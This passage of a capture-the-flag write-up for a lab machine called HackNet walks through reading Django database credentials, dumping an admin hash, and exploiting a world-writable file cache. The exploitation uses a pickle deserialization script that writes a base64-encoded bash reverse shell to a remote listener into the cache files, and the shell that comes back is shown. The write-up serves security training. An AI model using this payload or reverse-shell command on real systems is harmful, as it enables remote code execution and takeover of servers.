ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/2d50b98a88f7802ab20bd6bd34c97916" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">HackNet:</strong></span></span></p></div><pre id="https://www.notion.so/2d50b98a88f7803696cbf03aec4131a1" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>mikey@hacknet:/var/www/HackNet$</span></mark></span><span class="SemanticString"><span> ls -la HackNet/
+
+total 28
+drwxr-xr-x 3 sandy sandy 4096 Sep  8 05:20 .
+drwxr-xr-x 7 sandy sandy 4096 Feb 10  2025 ..
+-rw-r--r-- 1 sandy sandy  168 May 31  2024 asgi.py
+-rw-r--r-- 1 sandy sandy    0 May 31  2024 __init__.py
+drwxr-xr-x 2 sandy sandy 4096 Sep  8 05:22 __pycache__
+-rw-r--r-- 1 sandy sandy 2697 Feb 10  2025 settings.py
+-rw-r--r-- 1 sandy sandy  313 Sep  8 05:20 urls.py
+-rw-r--r-- 1 sandy sandy  168 May 31  2024 wsgi.py</span></span></span></code></pre><div id="https://www.notion.so/2d50b98a88f780de9909eab97dfe1d4a" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">This folder includes the Django configs. </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">settings.py</code></span><span class="SemanticString"> contains the app secret key and database creds.</span></span></p></div><pre id="https://www.notion.so/2d50b98a88f780e9b09cfeae78de4434" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token keyword">from</span> pathlib <span class="token keyword">import</span> Path
+<span class="token keyword">import</span> os
+
+BASE_DIR <span class="token operator">=</span> Path<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">.</span>resolve<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>parent<span class="token punctuation">.</span>parent
+
+SECRET_KEY <span class="token operator">=</span> <span class="token string">'agyasdf&amp;^F&amp;ADf87AF*Df9A5D^AS%D6DflglLADIuhldfa7w'</span>
+
+<span class="token punctuation">.</span><span class="token punctuation">.</span>SNIP<span class="token punctuation">.</span><span class="token punctuation">.</span>
+
+WSGI_APPLICATION <span class="token operator">=</span> <span class="token string">'HackNet.wsgi.application'</span>
+
+DATABASES <span class="token operator">=</span> <span class="token punctuation">{</span>
+    <span class="token string">'default'</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>
+        <span class="token string">'ENGINE'</span><span class="token punctuation">:</span> <span class="token string">'django.db.backends.mysql'</span><span class="token punctuation">,</span>
+        <span class="token string">'NAME'</span><span class="token punctuation">:</span> <span class="token string">'hacknet'</span><span class="token punctuation">,</span>
+        <span class="token string">'USER'</span><span class="token punctuation">:</span> <span class="token string">'sandy'</span><span class="token punctuation">,</span>
+        <span class="token string">'PASSWORD'</span><span class="token punctuation">:</span> <span class="token string">'h@ckn3tDBpa$$'</span><span class="token punctuation">,</span>
+        <span class="token string">'HOST'</span><span class="token punctuation">:</span><span class="token string">'localhost'</span><span class="token punctuation">,</span>
+        <span class="token string">'PORT'</span><span class="token punctuation">:</span><span class="token string">'3306'</span><span class="token punctuation">,</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+
+<span class="token punctuation">.</span><span class="token punctuation">.</span>SNIP<span class="token punctuation">.</span><span class="token punctuation">.</span></span></span></span></code></pre><div id="https://www.notion.so/2eb0b98a88f7804186b9f3e9a4442f38" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The creds can be used to access the MySQL instance running locally.</span></span></p></div><pre id="https://www.notion.so/2d50b98a88f7805d8dfed06791dae6f2" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>mikey@hacknet:/var/www/HackNet/HackNet$</span></mark></span><span class="SemanticString"><span> mysql -h localhost -u &#x27;sandy&#x27; -p&#x27;h@ckn3tDBpa$$&#x27;
+
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MariaDB connection id is 4065
+Server version: 10.11.11-MariaDB-0+deb12u1 Debian 12
+
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Type &#x27;help;&#x27; or &#x27;\h&#x27; for help. Type &#x27;\c&#x27; to clear the current input statement.
+
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>MariaDB [(none)]&gt;</span></mark></span><span class="SemanticString"><span> show databases;
+
++--------------------+
+| Database           |
++--------------------+
+| hacknet            |
+| information_schema |
+| mysql              |
++--------------------+
+3 rows in set (0.001 sec)</span></span></span></code></pre><div id="https://www.notion.so/2eb0b98a88f780a5beaee25968206d4c" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">There’s an admin hash in the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">hacknet</code></span><span class="SemanticString"> database, but it’s uncrackable.</span></span></p></div><pre id="https://www.notion.so/2d50b98a88f78074aac9facf5494f23a" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>MariaDB [hacknet]&gt;</span></mark></span><span class="SemanticString"><span> select username, email, password from auth_user;
++----------+-------+------------------------------------------------------------------------------------------+
+| username | email | password                                                                                 |
++----------+-------+------------------------------------------------------------------------------------------+
+| admin    |       | pbkdf2_sha256$720000$I0qcPWSgRbUeGFElugzW45$r9ymp7zwsKCKxckgnl800wTQykGK3SgdRkOxEmLiTQQ= |
++----------+-------+------------------------------------------------------------------------------------------+
+1 row in set (0.001 sec)</span></span></span></code></pre><h3 id="https://www.notion.so/2d50b98a88f7808e86d4cdf10bb1d3de" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/2d50b98a88f7808e86d4cdf10bb1d3de"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Writable Directories:</span></span></h3><div id="https://www.notion.so/2eb0b98a88f780c6b6c1d8318a729d44" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I’ll look for writable directories, and found </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/var/tmp/django_cache</code></span><span class="SemanticString">:</span></span></p></div><pre id="https://www.notion.so/2d50b98a88f780fcae77e6ec049d3e30" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>mikey@hacknet:/var/www/HackNet$</span></mark></span><span class="SemanticString"><span> find / -writable -type d 2&gt;/dev/null
+
+/dev/mqueue
+/dev/shm
+/var/tmp
+/var/tmp/django_cache
+/sys/fs/cgroup/user.slice/user-1000.slice/user@1000.service
+/sys/fs/cgroup/user.slice/user-1000.slice/user@1000.service/app.slice
+/sys/fs/cgroup/user.slice/user-1000.slice/user@1000.service/app.slice/dbus.socket
+/sys/fs/cgroup/user.slice/user-1000.slice/user@1000.service/init.scope
+/tmp
+/tmp/.XIM-unix
+..SNIP..</span></span></span></code></pre><div id="https://www.notion.so/2eb0b98a88f780e88c93f677e91a60bb" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">In fact, the folder has full 777 permissions.</span></span></p></div><pre id="https://www.notion.so/2d50b98a88f780d38fe3e994ee143434" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>mikey@hacknet:/var/tmp/django_cache$</span></mark></span><span class="SemanticString"><span> ls -la
+
+total 8
+drwxrwxrwx 2 sandy www-data 4096 Dec 24 10:10 .
+drwxrwxrwt 4 root  root     4096 Dec 25 00:00 ..</span></span></span></code></pre><div id="https://www.notion.so/2eb0b98a88f780b4a62be232e1eda285" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">As the name suggests, it’s related to Django caches. I had another look at the Django source files, and in </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">settings.py</code></span><span class="SemanticString"> seen earlier, I found this config:</span></span></p></div><pre id="https://www.notion.so/2d50b98a88f78061b245f5844a004a3a" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>CACHES <span class="token operator">=</span> <span class="token punctuation">{</span>
+    <span class="token string">'default'</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>
+        <span class="token string">'BACKEND'</span><span class="token punctuation">:</span> <span class="token string">'django.core.cache.backends.filebased.FileBasedCache'</span><span class="token punctuation">,</span>
+        <span class="token string">'LOCATION'</span><span class="token punctuation">:</span> <span class="token string">'/var/tmp/django_cache'</span><span class="token punctuation">,</span>
+        <span class="token string">'TIMEOUT'</span><span class="token punctuation">:</span> <span class="token number">60</span><span class="token punctuation">,</span>
+        <span class="token string">'OPTIONS'</span><span class="token punctuation">:</span> <span class="token punctuation">{</span><span class="token string">'MAX_ENTRIES'</span><span class="token punctuation">:</span> <span class="token number">1000</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span></span></span></span></code></pre><div id="https://www.notion.so/2eb0b98a88f780dba506c05e1e370f34" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">According to the </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://docs.djangoproject.com/en/6.0/topics/cache/#filesystem-caching">docs</a></span><span class="SemanticString">, this configures the cache to be saved as a file in </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/var/tmp/django_cache</code></span><span class="SemanticString">.</span></span></p></div><div id="https://www.notion.so/2eb0b98a88f780d29ba2c26dd1d1fd44" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">In </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">views.py</code></span><span class="SemanticString">, I also found this function:</span></span></p></div><pre id="https://www.notion.so/2d50b98a88f7801ea917c1833866a0f3" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token decorator annotation punctuation">@cache_page</span><span class="token punctuation">(</span><span class="token number">60</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">explore</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">if</span> <span class="token keyword">not</span> <span class="token string">"email"</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>session<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">"index"</span><span class="token punctuation">)</span>
+
+    session_user <span class="token operator">=</span> get_object_or_404<span class="token punctuation">(</span>SocialUser<span class="token punctuation">,</span> email<span class="token operator">=</span>request<span class="token punctuation">.</span>session<span class="token punctuation">[</span><span class="token string">'email'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+
+    page_size <span class="token operator">=</span> <span class="token number">10</span>
+    keyword <span class="token operator">=</span> <span class="token string">""</span>
+
+    <span class="token keyword">if</span> <span class="token string">"keyword"</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>GET<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        keyword <span class="token operator">=</span> request<span class="token punctuation">.</span>GET<span class="token punctuation">[</span><span class="token string">'keyword'</span><span class="token punctuation">]</span>
+        posts <span class="token operator">=</span> SocialArticle<span class="token punctuation">.</span>objects<span class="token punctuation">.</span><span class="token builtin">filter</span><span class="token punctuation">(</span>text__contains<span class="token operator">=</span>keyword<span class="token punctuation">)</span><span class="token punctuation">.</span>order_by<span class="token punctuation">(</span><span class="token string">"-date"</span><span class="token punctuation">)</span>
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        posts <span class="token operator">=</span> SocialArticle<span class="token punctuation">.</span>objects<span class="token punctuation">.</span><span class="token builtin">all</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>order_by<span class="token punctuation">(</span><span class="token string">"-date"</span><span class="token punctuation">)</span>
+
+    pages <span class="token operator">=</span> ceil<span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>posts<span class="token punctuation">)</span> <span class="token operator">/</span> page_size<span class="token punctuation">)</span>
+
+    <span class="token punctuation">.</span><span class="token punctuation">.</span>SNIP<span class="token punctuation">.</span><span class="token punctuation">.</span>
+
+    <span class="token keyword">return</span> render<span class="token punctuation">(</span>request<span class="token punctuation">,</span> <span class="token string">"SocialNetwork/explore.html"</span><span class="token punctuation">,</span> context<span class="token punctuation">)</span></span></span></span></code></pre><div id="https://www.notion.so/2eb0b98a88f7806d86bdfa910888f62d" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">There’s a </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">@cache_page(60)</code></span><span class="SemanticString"> decorator on the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">explore()</code></span><span class="SemanticString"> function. This means that whenever someone browses to the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/explore</code></span><span class="SemanticString"> page, its response will be cached for 60 seconds (</span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://docs.djangoproject.com/en/6.0/topics/cache/#the-per-view-cache">docs</a></span><span class="SemanticString">).</span></span></p></div><div id="https://www.notion.so/2d50b98a88f780d2bcd3dc9cb3de7a8f" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">At the moment, the cache folder is empty:</span></span></p></div><pre id="https://www.notion.so/2d50b98a88f7807f9d4de9f7959384a0" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>mikey@hacknet:/var/tmp/django_cache$</span></mark></span><span class="SemanticString"><span> ls -la
+
+total 8
+drwxrwxrwx 2 sandy www-data 4096 Dec 25 09:25 .
+drwxrwxrwt 4 root  root     4096 Dec 25 00:00 ..</span></span></span></code></pre><div id="https://www.notion.so/2d50b98a88f78056ad5fd8e0cc0c084b" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">After visiting </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">http://hacknet.htb/explore</code></span><span class="SemanticString">, two </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">.djcache</code></span><span class="SemanticString"> files are created:</span></span></p></div><pre id="https://www.notion.so/2d50b98a88f780e6a326c19d2fdef3a9" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>mikey@hacknet:/var/tmp/django_cache$</span></mark></span><span class="SemanticString"><span> ls -la
+
+total 16
+drwxrwxrwx 2 sandy www-data 4096 Dec 25 09:58 .
+drwxrwxrwt 4 root  root     4096 Dec 25 00:00 ..
+-rw------- 1 sandy www-data   34 Dec 25 09:58 1f0acfe7480a469402f1852f8313db86.djcache
+-rw------- 1 sandy www-data 2618 Dec 25 09:58 90dbab8f3b1e54369abdeb4ba1efc106.djcache</span></span></span></code></pre><div id="https://www.notion.so/2d50b98a88f780578368cb83bb6ee54c" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I don’t have permissions to read them, but it’s very likely pickle-serialized data based on this warning found in the </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://docs.djangoproject.com/en/6.0/topics/cache/#filesystem-caching">docs</a></span><span class="SemanticString">:</span></span></p></div><blockquote id="https://www.notion.so/2d50b98a88f78020ba24ee13cff5da37" class="ColorfulBlock ColorfulBlock--ColorDefault Quote"><span class="SemanticStringArray"><span class="SemanticString">An attacker who gains access to the cache file can not only falsify HTML content, which your site will trust, but also remotely execute arbitrary code, as the data is serialized using pickle.</span></span></blockquote><h3 id="https://www.notion.so/2d50b98a88f780a3984fd762e73ea5ef" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/2d50b98a88f780a3984fd762e73ea5ef"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Django Cache Deserialization:</span></span></h3><div id="https://www.notion.so/2d50b98a88f780ce8b25ed823304b833" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I’ve covered pickle deserialization some time ago in the </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://ch3ng625.github.io/devoops">DevOops writeup</a></span><span class="SemanticString">. The context is somewhat different, but the process of generating the serialized data is mostly the same.</span></span></p></div><div id="https://www.notion.so/2eb0b98a88f78001983fc5b6ccd7bb7f" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I’ll create </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://github.com/ch3ng625/CTF-scripts/blob/main/HTB/HackNet/djcache_rce.py">this script</a></span><span class="SemanticString"> to generate the pickle payload:</span></span></p></div><pre id="https://www.notion.so/2d50b98a88f780889b34cfb422558575" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token keyword">import</span> os
+<span class="token keyword">import</span> base64
+<span class="token keyword">import</span> pickle
+
+<span class="token keyword">class</span> <span class="token class-name">exploit</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> cmd<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        self<span class="token punctuation">.</span>payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"echo </span><span class="token interpolation"><span class="token punctuation">{</span>cmd<span class="token punctuation">}</span></span><span class="token string"> | base64 -d | bash"</span></span>
+    
+    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> <span class="token punctuation">(</span>os<span class="token punctuation">.</span>system<span class="token punctuation">,</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>payload<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+LHOST <span class="token operator">=</span> <span class="token string">"10.10.14.79"</span>
+LPORT <span class="token operator">=</span> <span class="token string">"8001"</span>
+
+cmd_raw <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"/bin/bash -i >&amp; /dev/tcp/</span><span class="token interpolation"><span class="token punctuation">{</span>LHOST<span class="token punctuation">}</span></span><span class="token string">/</span><span class="token interpolation"><span class="token punctuation">{</span>LPORT<span class="token punctuation">}</span></span><span class="token string"> 0>&amp;1"</span></span>
+cmd_b64 <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>cmd_raw<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+pickle_payload <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>exploit<span class="token punctuation">(</span>cmd_b64<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+<span class="token comment"># May need changing the file names</span>
+<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/var/tmp/django_cache/1f0acfe7480a469402f1852f8313db86.djcache"</span><span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
+    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>pickle_payload<span class="token punctuation">)</span>
+
+<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/var/tmp/django_cache/90dbab8f3b1e54369abdeb4ba1efc106.djcache"</span><span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
+    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>pickle_payload<span class="token punctuation">)</span></span></span></span></code></pre><div id="https://www.notion.so/2eb0b98a88f780fc88c0c38109cc722c" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">After running it on the box, the cache files are generated, this time owned by </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">mikey</code></span><span class="SemanticString">.</span></span></p></div><pre id="https://www.notion.so/2d50b98a88f7802f84f8f090c85b9414" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>mikey@hacknet:~$</span></mark></span><span class="SemanticString"><span> python3 djcache_rce.py 
+
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>mikey@hacknet:~$</span></mark></span><span class="SemanticString"><span> ls -la /var/tmp/django_cache/
+
+total 16
+drwxrwxrwx 2 sandy www-data 4096 Dec 25 11:26 .
+drwxrwxrwt 4 root  root     4096 Dec 25 00:00 ..
+-rw-r--r-- 1 mikey mikey     126 Dec 25 11:26 1f0acfe7480a469402f1852f8313db86.djcache
+-rw-r--r-- 1 mikey mikey     126 Dec 25 11:26 90dbab8f3b1e54369abdeb4ba1efc106.djcache</span></span></span></code></pre><div id="https://www.notion.so/2eb0b98a88f78026b83ec15193e39ffd" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I’ll start a </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">netcat</code></span><span class="SemanticString"> listener and reload the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/explore</code></span><span class="SemanticString"> page. A shell as </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">sandy</code></span><span class="SemanticString"> is immediately sent back.</span></span></p></div><pre id="https://www.notion.so/2d50b98a88f7800abe9de0d4f14fa71e" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/hacknet]
+└─$</span></mark></span><span class="SemanticString"><span> rlwrap nc -lvnp 8001
+
+listening on [any] 8001 ...
+connect to [10.10.14.79] from (UNKNOWN) [10.129.232.4] 50254
+bash: cannot set terminal process group (2805): Inappropriate ioctl for device
+bash: no job control in this shell
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>sandy@hacknet:/var/www/HackNet$</span></mark></span><span class="SemanticString"><span> id
+
+uid=1001(sandy) gid=33(www-data) groups=33(www-data)</span></span></span></code></pre><div id="https://www.notion.so/2d50b98a88f780048892c39a1ef19943" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/2d50b98a88f780139c39eff4d2c6477a" class="Divider"></div><h2 id="https://www.notion.so/2d50b98a88f78031863fd0c60807e4f7" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--2"><a class="Anchor" href="#https://www.notion.so/2d50b98a88f78031863fd0c60807e4f7"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Escalation from </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">sandy</code></span><span class="SemanticString">:</span></span></h2><h3 id="https://www.notion.so/2d50b98a88f780aba076c4777d5d3e26" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/2d50b98a88f780aba076c4777d5d3e26"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">GPG Keys:</span></span></h3><div id="https://www.notion.so/2eb0b98a88f780d4add4ff9f568b48b3" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">sandy</code></span><span class="SemanticString">&#x27;s home directory has a </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">.gnupg/</code></span><span class="SemanticString"> folder:</span></span></p></div><pre id="https://www.notion.so/2d50b98a88f78082aed3c57e78b36720" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>sandy@hacknet:~$</span></mark></span><span class="SemanticString"><span> ls -la
+
+total 36
+drwx------ 6 sandy sandy 4096 Sep 11 11:18 .
+drwxr-xr-x 4 root  root  4096 Jul  3  2024 ..
+lrwxrwxrwx 1 root  root     9 Sep  4 19:01 .bash_history -&gt; /dev/null
+-rw-r--r-- 1 sandy sandy  220 Apr 23  2023 .bash_logout
+-rw-r--r-- 1 sandy sandy 3526 Apr 23  2023 .bashrc
+drwxr-xr-x 3 sandy sandy 4096 Jul  3  2024 .cache
+drwx------ 3 sandy sandy 4096 Dec 21  2024 .config
+drwx------ 4 sandy sandy 4096 Sep  5 11:33 .gnupg
+drwxr-xr-x 5 sandy sandy 4096 Jul  3  2024 .local
+lrwxrwxrwx 1 root  root     9 Aug  8  2024 .mysql_history -&gt; /dev/null
+-rw-r--r-- 1 sandy sandy  808 Jul 11  2024 .profile
